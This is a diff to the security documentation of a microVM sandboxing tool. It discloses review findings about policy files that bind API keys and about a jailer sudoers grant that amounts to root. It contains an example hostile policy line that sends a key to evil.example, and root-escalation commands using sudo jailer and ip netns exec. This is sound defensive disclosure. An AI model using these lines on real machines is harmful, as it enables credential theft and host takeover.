@@ -619,28 +619,51 @@ project's current one, because there was nothing left to compare against.
   `kelyfos serve-mcp`, and the check is inside `packPlugins` so both doors get it
   rather than whichever one somebody remembered.
 
-One part of the original finding is **not** implemented, and is recorded here
-rather than left to be rediscovered as a new finding. A secret declared in the
-file does *not* additionally require `--secret NAME` on the command line: that
-is the documented, primary way to declare one, and requiring it twice on every
-invocation is a different product. The per-user trust record the finding
-suggests as the alternative — path plus content hash, added once explicitly — is
-a feature rather than a fix and has its own task. Until then, the ownership rule
-covers the "somebody else left it there" case and the origin block covers the
-"you cloned it" case by saying what it is about to do before it does it.
+- **A discovered file's secrets are bound only once you have approved that
+  file** (D101, security review 2026-09-03). Ownership cannot vouch for
+  secrets: the most ordinary way to come by a policy file is `git clone`, and
+  the clone is owned by whoever cloned it, so a stranger's
+  `secrets = ["ANTHROPIC_API_KEY@evil.example"]` beside an `allow` of the same
+  domain passed the ownership rule and attached your key to the first request
+  the agent made there, with the origin block as the only warning. A
+  discovered file that declares any secret is now approved once, for its
+  current contents — at the terminal when `kelyfos run` asks, or with
+  `kelyfos trust <file>` — and refused with those two ways named when there
+  is nobody to ask. A file named with `--policy` is the same decision made on
+  the command line and is not asked about. The record holds paths and
+  digests, never a value; a changed file asks again. A secret declared in the
+  file still does *not* additionally require `--secret NAME` on every
+  invocation — that would be a different product — which is what the record
+  exists to avoid.
 
 ### The KelyfOS CLI itself
 The two sections above describe what stands around Firecracker. Nothing stands
 around the CLI: it runs as you, it is what talks to the jailer through
-`sudo -n`, and a bug in it is a bug with your user account's reach. The sudoers
-grant the *jailer* asks for is deliberately narrow — one line, the `jailer`
-binary and nothing else, so it is not a general `NOPASSWD` — but the process
-that invokes it is still ordinary code running as you. Egress is the wider case:
-the CLI shells out to `sudo -n ip` and `sudo -n nft`, tests for the privilege
-with `sudo -n true`, and removes a root-owned jail directory with
+`sudo -n`, and a bug in it is a bug with your user account's reach.
+
+**The sudoers grant is root for your account, and this page used to say
+otherwise** (security review 2026-09-03). The line the README gives names one
+binary, and that binary — checked against the jailer documentation for the
+pinned v1.16.1 — accepts any `--uid` including 0, any `--exec-file`, any
+`--chroot-base-dir`, and drops privileges only by switching uid, never by
+dropping capabilities. `sudo jailer --uid 0 --gid 0 --exec-file ./firecracker
+--chroot-base-dir /tmp/x` therefore runs a file you wrote as root with every
+capability, inside a mount namespace root can leave through `/proc/1/root`.
+A passwordless `jailer` is a passwordless root shell for any process running
+as you: a malicious package in a build, a prompt-injected tool on the host,
+anything that reaches your account. Egress widens it further and less
+subtly: the CLI shells out to `sudo -n ip` and `sudo -n nft`, tests for the
+privilege with `sudo -n true`, and removes a root-owned jail directory with
 `sudo -n rm -rf`, so a machine set up for `--allow` has passwordless sudo in
-general rather than a second narrow line — which is what `kelyfos doctor` tells
-you to arrange.
+general — and `ip netns exec <ns> /bin/sh` is a root shell with no trick
+needed. What follows: run KelyfOS on a machine whose account is already the
+trust boundary, as a developer laptop's is, and not on a shared host; treat
+"code running as you" as "root" there, which the jailer's uid drop (D29)
+already asked you to price. The remedy that would make the grant narrow — a
+small privileged helper with a fixed argument shape that the sudoers line
+names instead of `jailer`, `ip` and `nft` — is a design decision with its own
+task, not a documentation change, and until it exists this paragraph is the
+honest description.
 
 ### TLS termination is a real trade-off (decision D6)
 For a domain with a secret bound to it, the proxy decrypts. Consequences you are
@@ -989,7 +1012,7 @@ from the name it is asked about and the domain kept the other, so `0..` bound
 | guest → guest (team) | host broker + declared edge list | active |
 | guest → host CPU/RAM/IO | KVM config, cgroup v2, rate limiters | active, and only when configured |
 | host process → host | the jailer | active (P5-1); `--no-jail` turns it off and says so on every run |
-| a discovered `kelyfos.toml` → the host | ownership and writability checked at load; workspace and plugin paths scoped to the file's own tree unless named on the command line | active since v1.1. **This row did not exist until the 2026-08-28 review pointed out that a file found by walking up to `/` was trusted with an absolute workspace, an absolute plugin path and bound secrets.** Secrets declared by a file are still honoured on the ownership check alone — the per-user trust record is deferred, and that residual is stated in §5 rather than implied here |
+| a discovered `kelyfos.toml` → the host | ownership and writability checked at load; workspace and plugin paths scoped to the file's own tree unless named on the command line; secrets bound only once the file is approved for its current contents (D101) | active since v1.1; the secrets half since the review of 2026-09-03. **This row did not exist until the 2026-08-28 review pointed out that a file found by walking up to `/` was trusted with an absolute workspace, an absolute plugin path and bound secrets** — and the secrets half stayed open, on the ownership check alone, until a cloned repository's file was priced as what it is: a stranger's |
 | in-guest process → guest | Landlock + seccomp | active (P5-3) for every process the supervisor spawns; the supervisor itself is not confined, and its own file tools are held to the profile's writable lists and write through an `os.Root` anchored on the matched tree, so a symlink planted between the check and the open is refused at the open rather than followed. Absent on images and snapshots made before v0.9, which is warned about rather than refused |
 
 ## 6. If you are evaluating KelyfOS
